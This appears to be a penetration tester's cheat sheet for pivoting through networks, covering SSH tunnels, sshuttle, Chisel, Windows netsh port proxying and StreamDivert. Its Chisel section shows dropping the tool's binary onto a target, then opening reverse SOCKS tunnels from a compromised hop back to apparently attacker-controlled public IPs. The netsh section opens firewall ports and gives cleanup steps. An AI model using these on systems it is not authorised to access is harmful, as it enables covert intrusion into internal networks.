
# SSH
```bash
# --- DYNAMIC TUNNELING (The SOCKS5 Proxy) ---
# Turns your SSH client into a local SOCKS5 proxy on port 1080. 
ssh -D 1080 -N -f user@middle

# --- VPN-STYLE ROUTING (sshuttle) ---
# Intercepts all traffic for a specific subnet (192.168.1.0/24) and routes it over SSH.
# Best for: Making all apps (SMB, HTTP, DB) work without configuring any proxy settings.
# (Requires 'sshuttle' installed on your local machine)
sshuttle -r user@middle 192.168.1.0/24

# --- STATIC LOCAL FORWARDING ---
# Maps a specific port on your machine (8080) to a specific remote service (internal-web:80).
# Best for: Accessing a single specific internal dashboard or database.
ssh -L 8080:internal-web:80 -N -f user@middle

# --- JUMP HOST (Chaining) ---
# Uses the middle server as a "jump box" to SSH directly into a hidden inner server.
# Best for: Accessing the terminal of servers that aren't public-facing.
ssh -J user@middle user@inner-server

# --- REVERSE TUNNELING ---
# Opens a port on the middle server (9000) that forwards back to your local port (3000).
# Best for: Letting people on the remote network see a website running on your laptop.
ssh -R 9000:localhost:1217 -N -f ubuntu@91.92.202.116
ssh -R 0.0.0.0:1217:localhost:1217 -f -N ubuntu@91.92.202.116

# --- LAYER 3 TUNNEL (True VPN) ---
# Creates a virtual network interface (tun0) for full packet-level routing.
# Best for: Advanced network-to-network routing (Requires root on both ends).
ssh -w 0:0 root@middle

# --- ESCAPE THE SHELL (Backgrounding) ---
# -N : Do not execute a remote command (use for tunnels only).
# -f : Requests SSH to go to background just before command execution.
# Use these flags with any -L, -D, or -R command to keep it running silently.
```

# Ligolo-ng (VPN)
# Chisel 
if it is okey to drop binaries to the machine download [chisel](https://github.com/jpillora/chisel/releases/tag/v1.10.1) :
```shell 
curl  -L https://github.com/jpillora/chisel/releases/download/v1.11.3/chisel_1.11.3_linux_386.deb -o /tmp/xchisel.deb && dpkg-deb -x /tmp/xchisel.deb /tmp && mv /tmp/usr/bin/chisel .

# Forward
# first Hoob
chisel server -p 1080 --socks5

# attacker
chisel client <TARGET_IP>:1080 1080:socks

# or Reverse
# attacker
chisel server --socks5 --reverse

# first Hoob
chisel client <ATTACK_IP>:1080 R:socks # full network 
chisel client <ATTACK_IP>:1080 R:1234:10.0.0.3:1234 # port forward

# or both 
chisel server -p 1080 --reverse --socks5
chisel client 91.92.141.42:1080 1080:socks R:8080:127.0.0.1:8080
```

#### chisel help
```php
chisel client <SERVER_IP:PORT> <Syntax>

SOCKS Syntax:
	R:1234:socks -> proxy on the server at port 1234 
	1234:socks -> proxy on THIS computer at port 1234
	(both do the same, jsut edit the conf of proxychais4)
```


# windows 
### LOLbin
```bash
# forwarding rule
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=445 connectaddress=192.168.1.6 connectport=445 protocol=tcp

# firewall rule 
netsh advfirewall firewall add rule name="" dir=in action=allow protocol=TCP localport=
```

check:
```
netsh interface portproxy show v4tov4
```
clean:
```bash
netsh int port delete v4tov4 listenaddress= listenport=
netsh advfirewall firewall delete rule name=""
```
--- 

# Other
#### kernal forwarding 
you can forward smb connection to another port without stopping the SMB wiht `SteamDivert`
```bash
# conf file (redir.conf)
tcp < 445 0.0.0.0 -> 192.168.1.6 445

# it will load the driver (singed)                                    ;) 
StreamDivert.exe redir.conf -v 
```

 
